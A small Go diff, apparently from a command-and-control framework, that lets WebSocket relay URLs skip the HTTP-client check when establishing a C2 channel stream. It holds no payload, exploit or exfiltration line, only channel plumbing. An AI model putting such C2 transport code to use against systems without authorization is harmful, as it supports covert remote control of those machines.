@@ -63,7 +63,10 @@ func EstablishC2Connection(url, streamID string, capabilities ...string) (conn i
 }
 
 func establishChannelStream(ctx context.Context, url string, channelWrapper transport.C2ChannelWrapper) (io.ReadWriteCloser, error) {
-	if def.HTTPClient == nil {
+	// Relay endpoints (worker_ws) dial their own WebSocket and need no HTTP client;
+	// other channels require def.HTTPClient for their transport.
+	isRelay := strings.HasPrefix(url, "ws://") || strings.HasPrefix(url, "wss://")
+	if !isRelay && def.HTTPClient == nil {
 		return nil, fmt.Errorf("http client is not initialized")
 	}
 
